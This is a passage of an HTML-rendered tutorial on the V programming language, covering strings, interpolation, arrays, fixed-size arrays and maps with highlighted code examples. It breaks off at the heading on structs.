</span></span><span style="display:flex;"><span><span style="color:#a6e22e">arr</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">bytes</span>() <span style="color:#75715e">// convert `string` to `[]u8`</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s2</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">bytestr</span>() <span style="color:#75715e">// convert `[]u8` to `string`</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">s</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">name</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Bob</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// indexing gives a byte, u8(66) == `B`</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">name</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#a6e22e">u8</span>(<span style="color:#ae81ff">66</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">// slicing gives a string &#39;ob&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">name</span>[<span style="color:#ae81ff">1..3</span>] <span style="color:#f92672">==</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">ob</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// escape codes</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// escape special characters like in C</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">windows_newline</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">windows_newline</span>.<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// arbitrary bytes can be directly specified using `\x##` notation where `#` is</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// a hex digit</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">aardvark_str</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span><span style="color:#a6e22e">x61ardvark</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">aardvark_str</span> <span style="color:#f92672">==</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">aardvark</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#e6db74">&#39;\xc0&#39;</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#a6e22e">u8</span>(<span style="color:#ae81ff">0xc0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// or using octal escape `\###` notation where `#` is an octal digit</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">aardvark_str2</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span><span style="color:#ae81ff">141</span><span style="color:#a6e22e">ardvark</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">aardvark_str2</span> <span style="color:#f92672">==</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">aardvark</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Unicode can be specified directly as `\u####` where # is a hex digit</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// and will be converted internally to its UTF-8 representation</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">star_str</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#39;\u2605&#39;</span> <span style="color:#75715e">// ★</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">star_str</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;★&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// UTF-8 can be specified this way too, as individual bytes.</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">star_str</span> <span style="color:#f92672">==</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span><span style="color:#a6e22e">xe2</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x98</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x85</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p>Note that indexing a string normally will produce a <code>u8</code> (byte), not a <code>rune</code> nor another <code>string</code>. Indexes correspond to <em>bytes</em> in the string, not Unicode code points. If you want to convert the <code>u8</code> to a <code>string</code>, use the <code>.ascii_str()</code> method on the <code>u8</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">country</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Netherlands</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">country</span>[<span style="color:#ae81ff">0</span>]) <span style="color:#75715e">// Output: 78</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">country</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">ascii_str</span>()) <span style="color:#75715e">// Output: N</span>
</span></span></code></pre></div><p>However, you can easily get the runes for a string with the <code>runes()</code> method, which will return an array of the UTF-8 characters from the string. You can then index this array. Just be aware that there may be fewer indexes available on the rune array than on the bytes in the string, if there are any non-ASCII characters.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">s</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">hello</span> <span style="color:#960050;background-color:#1e0010">🌎&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// there are 10 bytes in the string (as shown earlier), but only 7 runes, since the `world` emoji</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// only counts as one `rune` (one Unicode character)</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">runes</span>().<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">runes</span>()[<span style="color:#ae81ff">6</span>])
</span></span></code></pre></div><p>Prepend <code>r</code> for raw strings. Escapes are not handled, so you will get exacly what you type:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">s</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">hello</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nworld</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#75715e">// the `\n` will be preserved as two characters</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">s</span>) <span style="color:#75715e">// &#34;hello\nworld&#34;</span>
</span></span></code></pre></div><p>Strings can be easily converted to integers:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">s</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">42</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">n</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">s</span>.int() <span style="color:#75715e">// 42</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// all int literals are supported</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">0xc3</span><span style="color:#960050;background-color:#1e0010">&#39;</span>.int() <span style="color:#f92672">==</span> <span style="color:#ae81ff">195</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">o10</span><span style="color:#960050;background-color:#1e0010">&#39;</span>.int() <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">0b1111_0000_1010</span><span style="color:#960050;background-color:#1e0010">&#39;</span>.int() <span style="color:#f92672">==</span> <span style="color:#ae81ff">3850</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0b1111_0000_1010</span><span style="color:#960050;background-color:#1e0010">&#39;</span>.int() <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3850</span>
</span></span></code></pre></div><h4 id="string-interpolation">String interpolation</h4>
<p>Basic interpolation syntax is pretty simple - use <code>${</code> before a variable name and <code>}</code> after. The variable will be converted to a string and embedded into the literal:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">name</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Bob</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Hello</span>, <span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#a6e22e">name</span>}!<span style="color:#960050;background-color:#1e0010">&#39;</span>) <span style="color:#75715e">// Hello, Bob!</span>
</span></span></code></pre></div><h4 id="arrays">Arrays</h4>
<p>V arrays are homogeneous (all elements must have the same type). This means that code like <code>[1, 'a']</code> will not compile. The type of an array is determined by the first element:</p>
<ul>
<li><code>[1, 2, 3]</code> is an array of ints (<code>[]int</code>).</li>
<li><code>['a', 'b']</code> is an array of strings (<code>[]string</code>).</li>
</ul>
<p>The user can explicitly specify the type for the first element: <code>[u8(16), 32, 64, 128]</code>.</p>
<p>An element can be appended to the end of an array using the push operator &laquo;. It can also append an entire array.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">nums</span> <span style="color:#f92672">:=</span> [<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">30</span>]
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">nums</span>) <span style="color:#75715e">// `[10, 20, 30]`</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">nums</span> <span style="color:#f92672">:=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nums</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">nums</span>) <span style="color:#75715e">// &#34;[1, 2, 3, 4]&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// append array</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nums</span> <span style="color:#f92672">&lt;&lt;</span> [<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">7</span>]
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">nums</span>) <span style="color:#75715e">// &#34;[1, 2, 3, 4, 5, 6, 7]&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Declare an empty array:</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">users</span> <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">int</span>{}
</span></span></code></pre></div><p>The above syntax is fine for a small number of known elements but for very large or empty arrays there is a second initialization syntax:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">len</span>: <span style="color:#ae81ff">10000</span>, <span style="color:#a6e22e">cap</span>: <span style="color:#ae81ff">30000</span>, <span style="color:#a6e22e">init</span>: <span style="color:#ae81ff">3</span>}
</span></span></code></pre></div><p>This creates an array of 10000 <code>int</code> elements that are all initialized with 3. Memory space is reserved for 30000 elements. The parameters <code>len</code>, <code>cap</code> and <code>init</code> are optional; <code>len</code> defaults to 0 and <code>init</code> to the default initialization of the element type (<code>0</code> for numerical type, <code>''</code> for <code>string</code>, etc). The run time system makes sure that the capacity is not smaller than <code>len</code> (even if a smaller value is specified explicitly).</p>
<p>There are two fields that control the &ldquo;size&rdquo; of an array:</p>
<ul>
<li><code>len</code>: <strong>length</strong> - the number of pre-allocated and initialized elements in the array</li>
<li><code>cap</code>: <strong>capacity</strong> - the amount of memory space which has been reserved for elements, but not initialized or counted as elements. The array can grow up to this size without being reallocated. Usually, V takes care of this field automatically but there are cases where the user may want to do manual optimizations.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">nums</span> <span style="color:#f92672">:=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">nums</span>.<span style="color:#a6e22e">len</span>) <span style="color:#75715e">// &#34;3&#34;</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">nums</span>.<span style="color:#a6e22e">cap</span>) <span style="color:#75715e">// &#34;3&#34; or greater</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">arr</span> <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">len</span>: <span style="color:#ae81ff">5</span>, <span style="color:#a6e22e">init</span>: <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">// `arr == [-1, -1, -1, -1, -1]`, arr.cap == 5</span>
</span></span></code></pre></div><p>You can initialize the array by accessing the index variable which gives the index as shown here:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">count</span> <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">len</span>: <span style="color:#ae81ff">4</span>, <span style="color:#a6e22e">init</span>: <span style="color:#a6e22e">index</span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">count</span> <span style="color:#f92672">==</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">square</span> <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">len</span>: <span style="color:#ae81ff">6</span>, <span style="color:#a6e22e">init</span>: <span style="color:#a6e22e">index</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">index</span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">// square == [0, 1, 4, 9, 16, 25]</span>
</span></span></code></pre></div><p>You can learn more about different array types <a href="https://docs.vlang.io/v-types.html#array-types">here</a>.</p>
<h4 id="multi-dimensional-arrays">Multi-dimensional arrays</h4>
<p>Arrays can have more than one dimension.</p>
<p>2d array example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">:=</span> [][]<span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">len</span>: <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">init</span>: []<span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">len</span>: <span style="color:#ae81ff">3</span>}}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>] = <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">a</span>) <span style="color:#75715e">// [[0, 2, 0], [0, 0, 0]]</span>
</span></span></code></pre></div><p>3d array example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">:=</span> [][][]<span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">len</span>: <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">init</span>: [][]<span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">len</span>: <span style="color:#ae81ff">3</span>, <span style="color:#a6e22e">init</span>: []<span style="color:#66d9ef">int</span>{<span style="color:#a6e22e">len</span>: <span style="color:#ae81ff">2</span>}}}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>] = <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">a</span>) <span style="color:#75715e">// [[[0, 0], [0, 2], [0, 0]], [[0, 0], [0, 0], [0, 0]]]</span>
</span></span></code></pre></div><h4 id="fixed-size-arays">Fixed size arays</h4>
<p>V also supports arrays with fixed size. Unlike ordinary arrays, their length is constant. You cannot append elements to them, nor shrink them. You can only modify their elements in place.</p>
<p>However, access to the elements of fixed size arrays is more efficient, they need less memory than ordinary arrays, and unlike ordinary arrays, their data is on the stack, so you may want to use them as buffers if you do not want additional heap allocations.</p>
<p>Most methods are defined to work on ordinary arrays, not on fixed size arrays. You can convert a fixed size array to an ordinary array with slicing:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">fnums</span> <span style="color:#f92672">:=</span> [<span style="color:#ae81ff">3</span>]<span style="color:#66d9ef">int</span>{} <span style="color:#75715e">// fnums is a fixed size array with 3 elements.</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fnums</span>[<span style="color:#ae81ff">0</span>] = <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fnums</span>[<span style="color:#ae81ff">1</span>] = <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fnums</span>[<span style="color:#ae81ff">2</span>] = <span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">fnums</span>) <span style="color:#75715e">// =&gt; [1, 10, 100]</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">typeof</span>(<span style="color:#a6e22e">fnums</span>).<span style="color:#a6e22e">name</span>) <span style="color:#75715e">// =&gt; [3]int</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fnums2</span> <span style="color:#f92672">:=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">100</span>]! <span style="color:#75715e">// short init syntax that does the same (the syntax will probably change)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">anums</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fnums</span>[..] <span style="color:#75715e">// same as `anums := fnums[0..fnums.len]`</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">anums</span>) <span style="color:#75715e">// =&gt; [1, 10, 100]</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">typeof</span>(<span style="color:#a6e22e">anums</span>).<span style="color:#a6e22e">name</span>) <span style="color:#75715e">// =&gt; []int</span>
</span></span></code></pre></div><h4 id="maps">Maps</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">m</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">int</span>{} <span style="color:#75715e">// a map with `string` keys and `int` values</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">m</span>[<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">one</span><span style="color:#960050;background-color:#1e0010">&#39;</span>] = <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">m</span>[<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">two</span><span style="color:#960050;background-color:#1e0010">&#39;</span>] = <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">m</span>[<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">one</span><span style="color:#960050;background-color:#1e0010">&#39;</span>]) <span style="color:#75715e">// &#34;1&#34;</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">m</span>[<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">bad_key</span><span style="color:#960050;background-color:#1e0010">&#39;</span>]) <span style="color:#75715e">// &#34;0&#34;</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">bad_key</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">m</span>) <span style="color:#75715e">// Use `in` to detect whether such key exists</span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">keys</span>()) <span style="color:#75715e">// [&#39;one&#39;, &#39;two&#39;]</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">m</span>.delete(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">two</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span></code></pre></div><p>Maps can have keys of type string, rune, integer, float or voidptr.</p>
<p>The whole map can be initialized using this short syntax:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">numbers</span> <span style="color:#f92672">:=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">one</span><span style="color:#960050;background-color:#1e0010">&#39;</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">two</span><span style="color:#960050;background-color:#1e0010">&#39;</span>: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">numbers</span>)
</span></span></code></pre></div><p>If a key is not found, a zero value is returned by default:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">sm</span> <span style="color:#f92672">:=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">abc</span><span style="color:#960050;background-color:#1e0010">&#39;</span>: <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">xyz</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">val</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">sm</span>[<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">bad_key</span><span style="color:#960050;background-color:#1e0010">&#39;</span>]
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">val</span>) <span style="color:#75715e">// &#39;&#39;</span>
</span></span></code></pre></div><p>It&rsquo;s also possible to use an <code>or {}</code> block to handle missing keys:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">mm</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">int</span>{}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">val</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">mm</span>[<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">bad_key</span><span style="color:#960050;background-color:#1e0010">&#39;</span>] <span style="color:#a6e22e">or</span> { panic(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">key</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">found</span><span style="color:#960050;background-color:#1e0010">&#39;</span>) }
</span></span></code></pre></div><h4 id="map-update-syntax">Map update syntax</h4>
<p>V lets you initialise a map with an update applied on top of another map:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">base_map</span> = {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;a&#39;</span>: <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;b&#39;</span>: <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">foo</span> <span style="color:#f92672">:=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span><span style="color:#a6e22e">base_map</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;b&#39;</span>: <span style="color:#ae81ff">88</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;c&#39;</span>: <span style="color:#ae81ff">99</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>println(<span style="color:#a6e22e">foo</span>) <span style="color:#75715e">// {&#39;a&#39;: 4, &#39;b&#39;: 88, &#39;c&#39;: 99}</span>
</span></span></code></pre></div><h4 id="structs">Structs</h4>
<p>Structs can help design user-defined complex data types.</p>
